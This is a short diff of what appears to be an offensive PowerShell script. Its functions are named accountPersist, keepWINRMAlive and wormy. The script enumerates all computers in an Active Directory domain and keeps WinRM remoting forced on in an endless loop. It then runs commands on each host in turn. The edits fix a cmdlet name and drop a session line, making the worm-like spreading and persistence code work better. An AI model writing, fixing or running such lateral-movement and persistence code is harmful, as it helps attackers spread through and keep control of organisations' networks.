@@ -1,4 +1,6 @@
-﻿if(hostname -ne 'Windows10'){
+﻿
+
+if(hostname -ne 'Windows10'){
     $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
 }
 else{
@@ -43,7 +45,7 @@ function accountPersist{
 
 function keepWINRMAlive{
     While(1 -eq 1){
-        Enable-PSRemote -force
+        Enable-PSRemoting -force
         start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
     }
 }
@@ -58,7 +60,6 @@ function wormy{
     Start-Service WinRM
     Start-Service Winmgmt
     Foreach($i in $computerNames){
-        $s = new-pssession -ComputerName $i
         Write-Output $i
         invoke-command -ComputerName $i -ScriptBlock {
             if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
